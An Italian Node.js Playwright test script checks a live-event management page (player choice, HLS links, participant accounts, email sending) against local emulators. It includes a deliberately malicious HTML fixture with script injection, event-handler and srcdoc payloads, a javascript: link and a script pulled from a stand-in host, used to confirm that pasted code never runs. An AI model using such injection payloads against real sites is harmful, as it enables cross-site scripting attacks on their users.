/* ============================================================
   PROVE - la pagina di GESTIONE della diretta (/diretta/gestione/)
   contro il SERVIZIO VERO
   ------------------------------------------------------------
       cd diretta/prove && node gestione.prova.js

   Avvia da sola gli emulatori di Firebase (Firestore 8580, Auth
   9580), server-locale.js (funzioni vere api/diretta-*.js sulla
   3580, sito sulla 8590) e una diretta HLS vera trasmessa da ffmpeg
   (flusso-prova.js), apre la gestione in Chromium con la
   Content-Security-Policy vera e alla fine chiude tutto.

   IL SERVIZIO E' QUELLO VERO. Ogni chiamata della pagina arriva alle
   funzioni di email-service (diretta-gestione, diretta-accesso,
   diretta-cron) che leggono e scrivono gli emulatori; le email vanno
   nella posta finta del servizio (risultati/posta-gestione.jsonl,
   DIRETTA_POSTA_FINTA), da cui la prova legge i collegamenti e le
   password come farebbe una persona dalla sua casella.

   IL VIDEO ARRIVA SOLO DALLA WEB TV AZOTO, in due modalita' scelte
   dalla gestione per ogni evento («Tipo di player»):
     A) il PLAYER DI AZOTO in un iframe (la predefinita): qui il player
        finto di flusso-prova.js su https://cdn.azotosolutions.com
        (/cloudtv/livetv91/player e livetv92, livetv93 per i cambi
        d'indirizzo; /cloudtv/bloccato/ con X-Frame-Options: DENY;
        /cloudtv/altrove/ che rimanda a un altro sito; /cloudtv/lento/
        che non risponde MAI). Le prove non usano MAI la rete vera di
        Azoto: nel browser risponde instradaAzoto (context.route), e
        qualunque altro indirizzo di azotosolutions.com o dei siti del
        codice malevolo si registra e si blocca;
     B) il FLUSSO DIRETTO (.m3u8), qui la web TV di prova di
        flusso-prova.js su https://webtv.prova.test: una diretta HLS vera
        (ffmpeg, VP9 + Opus, due qualita') in risultati/webtv-gestione/,
        con /live/ e /riserva/ (i due "server"), /senza-cors/ (manca
        Access-Control-Allow-Origin) e /spento/ (404: la diretta non e'
        ancora partita).
   Il player di Azoto e la web TV li vede:
   - il browser (anteprima con i player veri, player-azoto.js e
     player-webtv.js; lettura CORS dal nostro sito), con instradaAzoto e
     instradaWebTv (context.route);
   - il SERVIZIO, che prova il link da Node con le sue protezioni SSRF:
     server-locale.js parte con DIRETTA_PROVE_WEBTV=<cartella> e passa
     a provaLink un fetch e un lookup finti SOLO per i nomi di prova
     (*.prova.test -> un indirizzo pubblico, interno.prova.test -> un
     indirizzo privato, cdn.azotosolutions.com -> il player finto, senza
     DNS ne' rete); tutto il resto (127.0.0.1 compreso) segue le strade
     vere del servizio. Niente rete esterna per il video.

   COME SI OTTENGONO I CASI DIFFICILI, senza fingere le risposte:
   - il gestore si attiva con «Primo accesso» (gestore-accesso): il
     collegamento arriva nella posta finta e la nuova password si
     sceglie con l'emulatore di Auth (accounts:resetPassword, quello
     che fa reimposta.html con confirmPasswordReset);
   - il caricamento "contemporaneo" di un altro gestore e' una
     chiamata vera a 'crea' fatta da qui, fra l'anteprima e la
     creazione; lo stesso per il player Azoto cambiato da un altro
     gestore ('evento-video') e per la «riconferma» del flusso diretto
     ('evento-player' con la modalita' gia' in uso, che nella regia non
     ha un pulsante: si vede quello che porta all'altra modalita');
   - gli indirizzi non consentiti si mandano anche al servizio
     direttamente (evento-salva, evento-video), come farebbe chi
     scavalcasse la pagina;
   - il blocco di Brevo, il tetto giornaliero e il giro automatico
     lento si ottengono RIAVVIANDO server-locale.js con gli interruttori
     della posta finta del servizio (DIRETTA_POSTA_ERRORE_ACCOUNT=1:
     accesso SMTP rifiutato; DIRETTA_MAX_GIORNO; DIRETTA_POSTA_RITARDO_MS)
     e chiamando davvero api/diretta-cron;
   - i segnali di presenza (che scrive la pagina dei partecipanti) si
     scrivono con firebase-admin nei documenti presenze/, e gli accessi
     sono chiamate vere a diretta-accesso 'entra' con le password lette
     dalle email.
   UNICO page.route SUL SERVIZIO: la rete che cade durante 'crea', per
   provare «Riprendi». Il primo tentativo del secondo gruppo arriva al
   servizio ma la risposta si perde (la creazione e' avvenuta), i due
   seguenti non partono proprio: e' il guasto che il servizio vero non
   sa produrre a comando. Tutte le altre risposte sono quelle del
   servizio.

   COSA DIMOSTRA. Accesso del gestore (password sbagliata, account fuori
   elenco, account "registrato da solo" che perde l'accesso e primo
   accesso con il collegamento); creazione dell'evento di Napoli;
   IL «TIPO DI PLAYER»: «Player Azoto (iframe)» scelto da solo,
   «Flusso diretto (.m3u8)» spento finche' nel suo riquadro non c'e' un
   link .m3u8 valido (e rifiutato al salvataggio se il link manca);
   IL PLAYER AZOTO: dal codice VERO che Azoto ci ha dato (div, iframe con
   le virgolette singole, script) si mostra subito, come testo, l'indirizzo
   del player, e si salva SOLO quello (nella richiesta evento-salva e in
   eventiRiservati.azotoUrl, letto con firebase-admin; mai HTML); gli
   indirizzi non consentiti rifiutati subito con il messaggio giusto,
   senza chiamare nessuno (un altro sito, azotosolutions.com senza cdn.,
   un sottodominio finto, la porta 8443, http://, javascript:, codice
   senza src, il primo iframe di un altro sito) e rifiutati anche dal
   servizio chiamato a mano (400, campo 'azoto'); il codice malevolo
   incollato (script, onload/onerror, <img onerror>, srcdoc, un secondo
   iframe di un altro sito, javascript:) non esegue niente
   (window.__attacco resta undefined), non fa partire richieste verso
   altri siti e se ne salva solo l'indirizzo di Azoto; «Prova il player»:
   livetv91 «Si può usare» con l'anteprima (iframe.player-azoto con gli
   attributi del contratto, la pagina del player dentro, i suoi comandi
   che rispondono al clic: niente sopra l'iframe), bloccato
   (X-Frame-Options) e altrove (rimanda fuori) «Non si può usare» senza
   anteprima, lento «Player Azoto: non risponde»; un .m3u8 nel campo di
   Azoto e il player di Azoto nel campo del flusso rifiutati con i
   messaggi 'e-flusso' ed 'e-azoto'. IL FLUSSO DIRETTO (modalita' B),
   come prima: riconosciuto mentre lo si scrive (HLS .m3u8, DASH .mpd;
   rifiutati http://, rtmp://, .mp4, una pagina, un PDF, testo), la prova
   prima di salvare (il flusso che funziona, con l'anteprima del player
   vero; il CORS mancante con il testo per la web TV e «Copia il testo per
   la web TV»; il flusso che non risponde, 404: «Salvare lo stesso?»;
   l'indirizzo privato e il nome che porta nella rete interna: niente
   salvato). Il documento pubblico eventi/<id> seguito per tutta la prova
   (onSnapshot): tipoPlayer sempre; l'indirizzo di Azoto o i link del
   flusso solo in videoId/videoRiserva, solo in onda e solo quelli della
   modalita' in uso; mai azotoUrl, videoUrl, la firma, ne' HTML.
   SI ENTRA CON L'EMAIL (nessun nome utente). L'interruttore «Invia
   subito la password a chi si iscrive dal modulo del sito»: spento di
   base, con la spiegazione; acceso su un'altra pagina gia' accesa (409
   'iscrizioni-doppie'), senza la pagina dell'evento (400 'pagina'), con
   la pagina scritta ma non salvata (lo dice la pagina), acceso e spento
   (eventiRiservati, mai nel documento pubblico), la pagina che non si
   toglie mentre e' acceso. Caricamento di esempio-partecipanti.csv: la
   stessa email scritta in modi diversi (maiuscole, spazi) e' la stessa
   persona («Doppia nel file», «Già registrata» se ha gia' l'account),
   la stessa email per persone diverse («Email condivisa», nel file o
   con l'account gia' registrato), email mancanti o non valide, nomi
   mancanti: gli esiti li da' il servizio (azione 'anteprima', con le
   righe del file), a colori, e «Crea gli account» resta spento finche'
   c'e' da correggere; correzioni in linea ed esclusione (ogni volta
   una nuova anteprima di tutto il file); creazione a gruppi di 25 con
   l'account di una persona creato nel frattempo da un altro
   caricamento (aggiunta, niente doppione) e la rete che cade (Riprendi,
   zero doppioni); «Crea gli account» NON manda nessuna email (posta
   finta vuota, tutti «da inviare») e lo dice; elenco senza nome utente
   con ricerca per nome, email e azienda; invio singolo, reinvio
   rifiutato entro un minuto (409 con il testo del servizio), nuova
   password da comunicare a voce (e poi «Sei iscritto anche a…» senza
   password), disattivazione, correzioni: il nome, l'email cambiata a
   credenziali partite (tornano «da inviare», si entra con la nuova
   email, «Invia ora» al nuovo indirizzo), l'email di un'altra persona
   (409 'email-occupata'), l'email respinta corretta (R3); REGIA: in onda con il player
   Azoto («Guarda»), il player cambiato per tutti (livetv91 -> livetv92,
   dal codice incollato; bloccato rifiutato), i link del flusso cambiati
   mentre si usa Azoto (chi guarda non vede cambiare niente), A -> B -> A
   con «Passa al flusso diretto per tutti» e «Torna al player Azoto per
   tutti» (eventi.tipoPlayer e videoId cambiano; videoAggiornato cambia
   anche alla riconferma), il flusso in uso che non si puo' togliere
   (pagina e servizio), in B la riserva («Passa alla riserva per tutti»,
   «Torna al link principale per tutti», «Riporta tutti sul link
   principale» che aggiorna comunque videoAggiornato, «Guarda»), il link
   principale cambiato per tutti dopo la prova, pausa con i link tolti ai
   partecipanti, avviso, contatore dei collegati; la SCHEDA EVENTO in
   onda (un modulo aperto da tempo non rimette il player vecchio, il
   player bloccato non si salva, «Togliere il player Azoto?», il codice
   malevolo salvato come solo indirizzo, «Cambiare il tipo di player per
   tutti?», il link del flusso cambiato); i LINK FIRMATI del flusso
   (nginx secure_link: la chiave si salva, non torna MAI in nessuna
   risposta del servizio, non e' nei documenti pubblici ne' nei log del
   servizio; link-firmato con md5 ed expires giusti, l'anteprima e la
   prova con il link firmato, la firma tolta); email di prova, invio a
   tutti fermato da Brevo, «Riprova adesso», tetto del giorno, giro
   automatico che lavora insieme alla pagina, reinvio a chi non l'ha
   ricevuta, esiti senza BREVO_API_KEY; esportazione in Excel con due
   fogli; la testata compatta sul telefono (390 e 360 px). Il file di
   esempio usa solo indirizzi su domini riservati (example.com,
   .example, .invalid).
   Screenshot in risultati/screenshot-gestione/ (computer 1440x900, tablet
   820x1180, testata del telefono) e in
   risultati/screenshot-gestione-azoto/, <nome>-computer.png (1440x900) e
   <nome>-telefono.png (390x844, a volte con il seguito -telefono-2.png):
     01-evento-tipo-player      la scheda Evento: «Tipo di player» e il
                                codice di Azoto incollato e provato, con
                                l'indirizzo che si salva e l'anteprima
     02-evento-flusso-provato   il riquadro del flusso diretto: «Si può
                                usare», con l'anteprima che va
     03-regia-azoto-in-onda     la regia in onda con il player Azoto e
                                «Guarda»
     04-regia-flusso-in-onda    la regia passata al flusso diretto, con la
                                riserva in uso per tutti e «Guarda»
     05-regia-azoto-cambiato    di nuovo il player Azoto per tutti, con
                                l'indirizzo cambiato durante la diretta
   Esce con 1 se qualcosa e' rosso.
   ============================================================ */
'use strict';
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const PORTE = { firestore: 8580, auth: 9580, api: 3580, statico: 8590 };
process.env.FIREBASE_AUTH_EMULATOR_HOST = '127.0.0.1:' + PORTE.auth;
process.env.FIRESTORE_EMULATOR_HOST = '127.0.0.1:' + PORTE.firestore;

const RADICE = path.resolve(__dirname, '../..');
const RISULTATI = path.join(__dirname, 'risultati');
const FOTO = path.join(RISULTATI, 'screenshot-gestione');
const FOTO_AZOTO = path.join(RISULTATI, 'screenshot-gestione-azoto');
const POSTA = path.join(RISULTATI, 'posta-gestione.jsonl');
// la cartella della diretta di prova (ffmpeg): la leggono il browser e il servizio
const CARTELLA_WEBTV = path.join(RISULTATI, 'webtv-gestione');
fs.mkdirSync(FOTO, { recursive: true });
fs.mkdirSync(FOTO_AZOTO, { recursive: true });

const admin = require(path.join(RADICE, 'email-service/node_modules/firebase-admin'));
const { chromium } = require('./node_modules/playwright');
const { preparaContesto } = require('./rete-prove');
const WT = require('./flusso-prova');
const V = require(path.join(RADICE, 'diretta/sorgente-video.js'));

const SITO = 'http://127.0.0.1:' + PORTE.statico;
const API = 'http://127.0.0.1:' + PORTE.api + '/api';
const AUTH_REST = 'http://127.0.0.1:' + PORTE.auth + '/identitytoolkit.googleapis.com/v1';
const EMAIL_GESTORE = 'gestore@prova.it';
const PASSWORD_GESTORE = 'Gestione-2026-prova';
// la password di chi si era "registrato da solo" con l'email del gestore
const PASSWORD_ABUSIVA = 'Mi-registro-da-solo-1';
const EMAIL_CURIOSO = 'curioso@prova.it';
const PASSWORD_CURIOSO = 'Curioso-2026-prova';
const ID = 'napoli-2026';
const SHEETJS_URL = 'https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js';
const SHEETJS_IMPRONTA = 'sha384-EnyY0/GSHQGSxSgMwaIPzSESbqoOLSexfnSMN2AP+39Ckmn92stwABZynq1JyzdT';
const UA_IPHONE = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1';
// l'alfabeto di lib/diretta-password.js: niente 0/O/o, 1/l/I/i
const RE_PASSWORD = /^[A-HJKMNP-Za-hjkmnp-z2-9]{10}$/;

/* Il player di Azoto finto (flusso-prova.js): i canali livetv<N>
   rispondono, gli altri tre sono i guasti da provare. */
const AZOTO = WT.AZOTO;
const AZOTO_29 = AZOTO + '/cloudtv/livetv91/player';
const AZOTO_30 = AZOTO + '/cloudtv/livetv92/player';
const AZOTO_31 = AZOTO + '/cloudtv/livetv93/player';
const AZOTO_BLOCCATO = AZOTO + '/cloudtv/bloccato/player';
const AZOTO_ALTROVE = AZOTO + '/cloudtv/altrove/player';
const AZOTO_LENTO = AZOTO + '/cloudtv/lento/player';
// il codice VERO che Azoto ci ha dato, cosi' com'e' (virgolette singole, script compreso)
const codiceAzoto = indirizzo => '<div class=\'azoto-player-container\'>\n'
    + '<iframe src=\'' + indirizzo + '\' frameborder=\'0\' scrolling=\'no\' allowfullscreen></iframe>\n'
    + '</div>\n'
    + '<script src=\'https://azotosolutions.com/videojs/azoto-player.js\'></script>';
const CODICE_AZOTO = codiceAzoto(AZOTO_29);
/* Il codice malevolo che qualcuno potrebbe incollare (o farsi incollare):
   uno script, i gestori onmouseover/onload/onerror, un'immagine che non
   c'e' con onerror, srcdoc (PRIMA di src, per confondere chi legge gli
   attributi), un secondo iframe e uno script di un altro sito, un link
   javascript:. Se una sola di queste cose entrasse nella pagina,
   window.__attacco cambierebbe o partirebbe una richiesta verso
   cattivo.example, verso azotosolutions.com (il loro script, che non
   carichiamo) o verso .../gestione/x (l'immagine). Il primo iframe e'
   quello di Azoto: se ne deve prendere solo l'indirizzo. */
const codiceMalevolo = indirizzo => '<div class=\'azoto-player-container\' onmouseover="window.__attacco=\'div\'">'
    + '<script>window.__attacco = "script"</script>'
    + '<img src=x onerror="window.__attacco=\'img\'">'
    + '<iframe srcdoc="<script>parent.__attacco=\'srcdoc\'</script>" onload="window.__attacco=\'onload\'" onerror="window.__attacco=\'onerror\'" src=\'' + indirizzo + '\' frameborder=\'0\' allowfullscreen></iframe>'
    + '<iframe src="https://cattivo.example/player" onload="window.__attacco=\'secondo-iframe\'"></iframe>'
    + '<a href="javascript:window.__attacco=\'link\'">guarda</a></div>'
    + '<script src="https://cattivo.example/x.js"></script>'
    + '<script src=\'https://azotosolutions.com/videojs/azoto-player.js\'></script>';
// le richieste che il codice malevolo farebbe partire, se entrasse nella pagina
const RE_RICHIESTE_VIETATE = /cattivo\.example|evil\.test|\/\/(?:www\.)?azotosolutions\.com[:/]|\/gestione\/x(?:[?#]|$)/;

/* I link della web TV di prova (flusso-prova.js): il flusso diretto. */
const WEBTV = WT.WEBTV;
const LINK = {
    live: WEBTV + '/live/master.m3u8',
    riserva: WEBTV + '/riserva/master.m3u8',
    senzaCors: WEBTV + '/senza-cors/master.m3u8',
    spento: WEBTV + '/spento/master.m3u8',
    dash: WEBTV + '/live/manifest.mpd',
    pagina: WEBTV + '/player/napoli',
    pdf: WEBTV + '/documento.pdf',
    // lo stesso flusso con un altro indirizzo: il "nuovo" link durante la diretta
    canale2: WEBTV + '/live/master.m3u8?canale=2',
    dallEvento: WEBTV + '/live/master.m3u8?canale=4',
    ipPrivato: 'https://127.0.0.1/live/master.m3u8',
    nomeInterno: 'https://interno.prova.test/live/master.m3u8'
};
// i messaggi di sorgente-video.js (le stesse regole in gestione, servizio e player)
const MSG = codice => V.messaggio({ errore: codice });
const SITO_PUBBLICO = 'https://nextgenerationbusiness.it';
// la chiave dei link firmati: si scrive una volta e non deve tornare MAI indietro
const SEGRETO = 'Chiave-Segreta-nginx-7Qx9-prova';

/* Le variabili del servizio in ogni fase della prova. La base e' quella
   chiesta: posta finta nella cartella risultati/, un solo gestore,
   l'indirizzo di Chloé che il "server di posta" rifiuta (550) e la web TV
   di prova per la prova dei link (DIRETTA_PROVE_WEBTV: vedi
   server-locale.js). */
const SERVIZIO_BASE = {
    DIRETTA_PROVE_WEBTV: CARTELLA_WEBTV,
    DIRETTA_POSTA_FINTA: POSTA,
    DIRETTA_ADMIN_EMAILS: EMAIL_GESTORE,
    DIRETTA_POSTA_RIFIUTA: 'chloe.dupont@dupont.invalid',
    DIRETTA_MAX_GIORNO: '0',
    DIRETTA_POSTA_ERRORE_ACCOUNT: '',
    DIRETTA_POSTA_RITARDO_MS: '0'
};

let rossi = 0, verdi = 0;
function vero(cond, descrizione, dettaglio) {
    if (cond) { verdi++; console.log('  ok  ' + descrizione); }
    else { rossi++; console.log('ROSSO ' + descrizione + (dettaglio !== undefined ? '\n       ' + String(dettaglio).slice(0, 600) : '')); }
    return !!cond;
}
const pausa = ms => new Promise(r => setTimeout(r, ms));

/* ---------- processi di appoggio ---------- */
function avvia(argomenti, pronto, nome, env) {
    return new Promise((risolvi, rifiuta) => {
        const figlio = spawn(process.execPath, argomenti, {
            cwd: __dirname, stdio: ['ignore', 'pipe', 'pipe'],
            env: Object.assign({}, process.env, { FORCE_COLOR: '0' }, env || {})
        });
        figlio.uscita = '';
        // tutta l'uscita, senza tagli (per cercarci la chiave dei link firmati)
        figlio.tuttaUscita = '';
        let partito = false;
        const limite = setTimeout(() => { figlio.kill('SIGTERM'); rifiuta(new Error(nome + ' non partito in tempo:\n' + figlio.uscita.slice(-2000))); }, 150000);
        const leggi = d => {
            figlio.uscita = (figlio.uscita + d.toString()).slice(-200000);
            figlio.tuttaUscita += d.toString();
            if (!partito && pronto.test(figlio.uscita)) { partito = true; clearTimeout(limite); risolvi(figlio); }
        };
        figlio.stdout.on('data', leggi);
        figlio.stderr.on('data', leggi);
        figlio.on('exit', c => { clearTimeout(limite); if (!partito) rifiuta(new Error(nome + ' uscito (' + c + '):\n' + figlio.uscita.slice(-2000))); });
    });
}
function ferma(figlio) {
    return new Promise(r => {
        if (!figlio || figlio.exitCode !== null) return r();
        figlio.removeAllListeners('exit');
        figlio.on('exit', () => r());
        figlio.kill('SIGINT');
        setTimeout(() => { try { figlio.kill('SIGKILL'); } catch (_) { /* gia' fermo */ } r(); }, 8000);
    });
}

let server = null;
const uscitaServer = [];
async function avviaServer(extra, descrizione, fermo) {
    // prima di spegnerlo si aspetta che la pagina non abbia richieste in viaggio
    if (fermo) await fermo();
    if (server) { uscitaServer.push(server.tuttaUscita); await ferma(server); server = null; }
    const env = Object.assign({}, SERVIZIO_BASE, extra || {});
    server = await avvia([path.join(__dirname, 'server-locale.js'), '--api', String(PORTE.api), '--statico', String(PORTE.statico),
        '--firestore', String(PORTE.firestore), '--auth', String(PORTE.auth)], /SERVER LOCALE PRONTO/, 'server locale', env);
    if (descrizione) console.log('   (servizio riavviato: ' + descrizione + ')');
    return server;
}

/* ---------- il servizio visto da qui (come farebbe un altro gestore) ---------- */
async function postJSON(url, corpo, intestazioni) {
    const r = await fetch(url, { method: 'POST', headers: Object.assign({ 'Content-Type': 'application/json' }, intestazioni || {}), body: JSON.stringify(corpo) });
    let j = null;
    try { j = await r.json(); } catch (_) { j = null; }
    return { stato: r.status, dati: j };
}
async function api(funzione, corpo, token, intestazioni) {
    return postJSON(API + '/' + funzione, corpo, Object.assign(token ? { Authorization: 'Bearer ' + token } : {}, intestazioni || {}));
}
async function tokenDi(email, password) {
    const r = await postJSON(AUTH_REST + '/accounts:signInWithPassword?key=finta', { email: email, password: password, returnSecureToken: true });
    return r.stato === 200 ? r.dati.idToken : null;
}

/* ---------- la posta finta ---------- */
function leggiPosta() {
    if (!fs.existsSync(POSTA)) return [];
    return fs.readFileSync(POSTA, 'utf8').split('\n').filter(Boolean).map(r => JSON.parse(r));
}
const postaPer = (indirizzo, tipo) => leggiPosta().filter(m => m.a === indirizzo && (!tipo || m.tipo === tipo));
function passwordDa(messaggio) {
    const m = /Password:\s*(\S+)/.exec(String(messaggio && messaggio.testo || ''));
    return m ? m[1] : '';
}

/* ---------- SheetJS anche in Node, per rileggere l'Excel scaricato ---------- */
async function sheetJSNode() {
    const k = crypto.createHash('sha256').update(SHEETJS_URL).digest('hex').slice(0, 40);
    const cache = path.join(RISULTATI, 'cache-rete');
    fs.mkdirSync(cache, { recursive: true });
    const bin = path.join(cache, k + '.bin');
    if (!fs.existsSync(bin)) {
        const r = await fetch(SHEETJS_URL);
        if (!r.ok) throw new Error('SheetJS non scaricata: ' + r.status);
        fs.writeFileSync(bin, Buffer.from(await r.arrayBuffer()));
        fs.writeFileSync(path.join(cache, k + '.json'), JSON.stringify({ stato: 200, tipo: r.headers.get('content-type') || 'application/javascript' }));
    }
    const dati = fs.readFileSync(bin);
    const impronta = 'sha384-' + crypto.createHash('sha384').update(dati).digest('base64');
    const copia = path.join(RISULTATI, 'xlsx-node.js');
    fs.writeFileSync(copia, dati);
    return { XLSX: require(copia), impronta: impronta };
}

/* ============================================================
   LA PROVA
   ============================================================ */
(async () => {
    let emulatori = null, browser = null, trasmissione = null, smettiDiGuardare = null, paginaAperta = null;
    const erroriPaginaAperta = [];
    const t0 = Date.now();
    try {
        const { XLSX, impronta } = await sheetJSNode();
        vero(impronta === SHEETJS_IMPRONTA, 'SheetJS 0.20.3 dalla CDN ufficiale: l\'impronta del file coincide con quella scritta nella pagina');
        const codiceGestione = fs.readFileSync(path.join(RADICE, 'diretta/gestione/gestione.js'), 'utf8');
        vero(codiceGestione.includes(SHEETJS_IMPRONTA) && codiceGestione.includes(SHEETJS_URL), 'la gestione carica SheetJS con URL e integrity della decisione D15');
        const htmlGestione = fs.readFileSync(path.join(RADICE, 'diretta/gestione/index.html'), 'utf8');
        vero(!/<script(?![^>]*\bsrc=)[^>]*>/i.test(htmlGestione) && !/\son[a-z]+=/i.test(htmlGestione), 'nessuno script in linea e nessun gestore on...= nell\'HTML (CSP)');
        vero(!/\.(innerHTML|outerHTML)\s*=|insertAdjacentHTML/.test(codiceGestione), 'gestione.js non usa innerHTML/outerHTML/insertAdjacentHTML (D3)');
        vero(!/nome-utente\.js|NGBNomeUtente|nomeUtente|analizzaRighe|omonim/i.test(codiceGestione + htmlGestione) && !/nome utente/i.test(htmlGestione)
            && !fs.existsSync(path.join(RADICE, 'diretta/nome-utente.js')),
            'si entra con l\'email: la gestione non carica più nome-utente.js (cancellato), non usa window.NGBNomeUtente e in nessun testo della pagina compare un «nome utente»');
        const cssGestione = fs.readFileSync(path.join(RADICE, 'diretta/gestione/gestione.css'), 'utf8');
        // le vecchie piattaforme si scrivono a pezzi, per non comparire nelle ricerche (come in email-service/prove/diretta-video.prove.js)
        const VECCHIE = new RegExp(['you' + 'tube', 'you' + 'tu\\.be', 'vim' + 'eo', 'NGBPlayer\\.nome', '\\bidDa\\b'].join('|'), 'i');
        vero(!VECCHIE.test(codiceGestione + htmlGestione + cssGestione),
            'la gestione (js, html, css) non nomina altre piattaforme video né il vecchio player (NGBPlayer.nome/idDa): il video arriva solo dalla web TV Azoto');
        vero(/<script src="\.\.\/sorgente-video\.js[^"]*"><\/script>\s*<script src="\.\.\/player-webtv\.js[^"]*"><\/script>\s*<script src="\.\.\/player-azoto\.js[^"]*"><\/script>\s*<script src="gestione\.js/.test(htmlGestione),
            'la gestione carica sorgente-video.js (le regole dei link, le stesse del servizio), player-webtv.js e player-azoto.js (i player dei partecipanti, per l\'anteprima)');
        const cspGestione = (/http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(htmlGestione) || [])[1] || '';
        const direttiva = nome => ((new RegExp('(?:^|;)\\s*' + nome + ' ([^;]*)').exec(cspGestione) || [])[1] || '').trim();
        vero(direttiva('frame-src') === 'https://cdn.azotosolutions.com' && !/azotosolutions/.test(direttiva('script-src')),
            'CSP della gestione: negli iframe solo il player di Azoto (frame-src https://cdn.azotosolutions.com); nessuno script di Azoto (azoto-player.js non si carica)', cspGestione);
        const notaHtml = ((/<p class="aiuto nota-azoto">([^<]*)<\/p>/.exec(htmlGestione) || [])[1] || '').replace(/&#39;/g, '\'');
        vero(notaHtml === V.AVVISO_INCORPORATO && /SV\.AVVISO_INCORPORATO/.test(codiceGestione),
            'la nota sotto il campo del player Azoto è quella di sorgente-video.js (AVVISO_INCORPORATO), e gestione.js la prende da lì: «' + V.AVVISO_INCORPORATO + '»', notaHtml);
        const codicePlayerAzoto = fs.readFileSync(path.join(RADICE, 'diretta/player-azoto.js'), 'utf8');
        vero(!/\.(innerHTML|outerHTML)\s*=|insertAdjacentHTML|document\.write|srcdoc/.test(codicePlayerAzoto) && /document\.createElement\('iframe'\)/.test(codicePlayerAzoto),
            'player-azoto.js costruisce l\'iframe con document.createElement: niente innerHTML, document.write o srcdoc (l\'HTML incollato non entra mai nella pagina)');
        vero(fs.readFileSync(path.join(RADICE, 'diretta/sorgente-video.js'), 'utf8') === fs.readFileSync(path.join(RADICE, 'email-service/lib/diretta-sorgente-video.js'), 'utf8'),
            'sorgente-video.js e la copia del servizio (lib/diretta-sorgente-video.js) sono identiche: gestione e servizio riconoscono i link allo stesso modo');
        vero(JSON.stringify(V.HOST_AZOTO) === JSON.stringify(['cdn.azotosolutions.com']) && V.perAzoto(CODICE_AZOTO).valore === AZOTO_29,
            'le regole: un solo server di Azoto ammesso (HOST_AZOTO = cdn.azotosolutions.com), e dal codice vero si ricava ' + AZOTO_29);
        const csvEsempio = fs.readFileSync(path.join(__dirname, 'esempio-partecipanti.csv'), 'utf8');
        const indirizziEsempio = csvEsempio.split(/\r?\n/).slice(1).map(r => (r.split(';')[2] || '').trim()).filter(e => e.includes('@'));
        const riservato = e => /@(?:[^@\s]+\.)?(example\.com|example\.org|example\.net)$|\.(example|test|invalid)$/i.test(e);
        vero(indirizziEsempio.length === 41 && indirizziEsempio.every(riservato),
            'esempio-partecipanti.csv: tutti gli indirizzi (' + indirizziEsempio.length + ') su domini riservati che non ricevono posta (example.com, .example, .invalid…)',
            indirizziEsempio.filter(e => !riservato(e)).join(', '));

        console.log('\n-- avvio della diretta di prova (ffmpeg), degli emulatori e del servizio vero (porte ' + JSON.stringify(PORTE) + ')');
        try { fs.unlinkSync(POSTA); } catch (_) { /* non c'era */ }
        fs.rmSync(path.join(CARTELLA_WEBTV, 'controllo.json'), { force: true });
        fs.readdirSync(FOTO_AZOTO).filter(f => /\.png$/.test(f)).forEach(f => fs.unlinkSync(path.join(FOTO_AZOTO, f)));
        trasmissione = await WT.avviaTrasmissione(CARTELLA_WEBTV);
        vero(fs.existsSync(path.join(CARTELLA_WEBTV, 'hls/master.m3u8')) && fs.readdirSync(path.join(CARTELLA_WEBTV, 'hls')).filter(f => /\.m4s$/.test(f)).length >= 6,
            'la web TV di prova trasmette: diretta HLS vera (ffmpeg, due qualità) in ' + path.relative(__dirname, CARTELLA_WEBTV));
        emulatori = await avvia([path.join(__dirname, 'avvia-emulatori.js'), '--firestore', String(PORTE.firestore), '--auth', String(PORTE.auth)], /EMULATORI PRONTI/, 'emulatori');
        await avviaServer();

        const app = admin.initializeApp({ projectId: 'demo-ngb-eventi' }, 'prova-gestione');
        const auth = app.auth();
        const db = app.firestore();
        const Ts = admin.firestore.Timestamp;
        /* Il documento pubblico dell'evento, come lo riceve ogni iscritto
           (l'unico ascolto della pagina della diretta): se ne tiene ogni
           versione, per controllare alla fine che i link della web TV ci
           siano stati SOLO in videoId/videoRiserva e SOLO in onda. */
        const versioniPubblico = [];
        smettiDiGuardare = db.doc('eventi/' + ID).onSnapshot(sn => { if (sn.exists) versioniPubblico.push(sn.data()); },
            e => versioniPubblico.push({ erroreAscolto: String(e && e.message) }));
        // qualcuno fuori elenco, e qualcuno che si e' registrato da solo con l'email del gestore
        await auth.createUser({ email: EMAIL_CURIOSO, password: PASSWORD_CURIOSO, emailVerified: true });
        await auth.createUser({ email: EMAIL_GESTORE, password: PASSWORD_ABUSIVA, emailVerified: false });

        // si entra con l'email: la persona si trova dall'indirizzo (indirizzi/{email} -> uid)
        const partecipante = async email => {
            const i = await db.doc('indirizzi/' + email).get();
            if (!i.exists) return null;
            const p = await db.doc('partecipanti/' + i.data().uid).get();
            return p.exists ? Object.assign({ uid: p.id }, p.data()) : null;
        };
        const uidDi = async email => ((await partecipante(email)) || {}).uid;
        const delEvento = async () => (await db.collection('partecipanti').where('eventi', 'array-contains', ID).get()).docs.map(d => Object.assign({ uid: d.id }, d.data()));
        const statiEmail = async () => {
            const k = {};
            (await delEvento()).forEach(p => { const s = ((p.invii || {})[ID] || {}).stato || 'da inviare'; k[s] = (k[s] || 0) + 1; });
            return k;
        };

        // lingua del sistema italiana: i campi data e ora del browser si mostrano
        // come li vede il gestore (14:30 e 02/10/2026, non 02:30 PM e 10/02/2026)
        browser = await chromium.launch({
            executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome', args: ['--lang=it-IT'],
            env: Object.assign({}, process.env, { LANG: 'it_IT.UTF-8', LANGUAGE: 'it', LC_ALL: 'it_IT.UTF-8' })
        });
        const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, acceptDownloads: true, locale: 'it-IT', timezoneId: 'Europe/Rome' });
        await preparaContesto(context, {});
        /* Ogni richiesta del browser, per intero: il codice malevolo non
           deve farne partire nessuna, e verso Azoto devono passare solo
           quelle del player finto. Gli altri indirizzi di azotosolutions.com
           (il loro script, che non carichiamo) e i siti del codice malevolo
           non vanno MAI in rete: si registrano e si bloccano (registrata
           prima di instradaAzoto, che per cdn.azotosolutions.com vince). */
        const tutteLeRichieste = [];
        context.on('request', q => tutteLeRichieste.push(q.url()));
        const bloccate = [];
